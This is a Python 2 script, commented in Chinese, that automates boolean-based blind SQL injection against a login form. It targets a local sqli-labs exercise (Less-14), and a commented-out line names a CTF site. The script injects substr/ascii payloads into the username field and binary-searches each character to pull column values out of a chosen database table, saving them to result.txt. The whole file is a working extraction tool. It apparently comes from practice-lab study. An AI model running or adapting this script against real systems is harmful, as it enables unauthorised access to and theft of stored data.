# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
import time
import string
#脚本应用于get请求单框注入情况下
#定义一个url
#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
url='http://localhost/sqli-labs/Less-14/?id=' #简单sql注入2
#指定爆破数据库的名称
database='test'
table='interface'
column='cename'
#-------------------------------------------------------------------------------------------------#
for tablenum in range(0,30):#假设有30个结果
    payload1_attack = '-1"'+" or ascii(substr((select "+column+" from "+database+"."+table+" group by "+column+" limit "+str(tablenum)+",1),"
    f = file("result.txt", "w+")
    # 定义攻击载荷
    keyword = 'flag.jpg'
    payload_end = ' -- #/*'
    password = '*/-- #'
    versionlen=0
    stop=False
    wList=[]
    Answer=''
    #需要注意的是如果wList中的数字不是字符型变量，会导致'.'等符号被误MySQL数据库认为0的情况发生
    for num in range(0,128):
        # print str(num)
        wList.append(str(num))
    for i in range(1,40):#假设每个结果最长有40个字符
        payload1=payload1_attack+str(i)+",1))>"
        # payload1=payload1_database+ str(i) + ",1))>'"
        lo=0
        hi=len(wList)-1
        # print 'hi='+str(hi)
        while lo<=hi:
            try:
                # print 'lo='+str(lo)
                # print 'hi=' + str(hi)
                mid = (lo + hi) / 2
                payload = payload1 + wList[mid] + payload_end
                # print payload
                # print url + payload
                postdata = dict(uname=payload, passwd=password, submit='Submit')
                # url编码
                postdata = urllib.urlencode(postdata)
                # print postdata
                # enable cookie
                req = urllib2.Request(url, postdata)
                res = urllib2.urlopen(req, data=None, timeout=2)
                text = res.read()
                if (text.find(keyword) > -1):
                    if(hi==lo or (hi-lo)==1):
                        # print '第' + str(i) + '个字符为：' + wList[mid + 1] + ' 转义后为：' + str(chr(mid + 1))
                        Answer+=str(chr(mid+1))
                        f.writelines(str(chr(mid+1)))
                        break
                    # print '第' + str(i) + '个字符大于：'+wList[mid]
                    lo=mid+1
                    # break
                else:
                    # print '未找到结果'
                    if(hi==lo):
                        if (mid>0):
                            # print '第' + str(i) + '个字符为：' + wList[mid] + ' 转义后为：' + str(chr(mid))
                            Answer+=str(chr(mid))
                            f.writelines(str(chr(mid)))
                        break
                    else:
                        # print '转到了这里'
                        hi=mid-1
            except Exception, e:
                print e
    f.close()
    if len(Answer)<1:
        break
    print '结果为：'+Answer
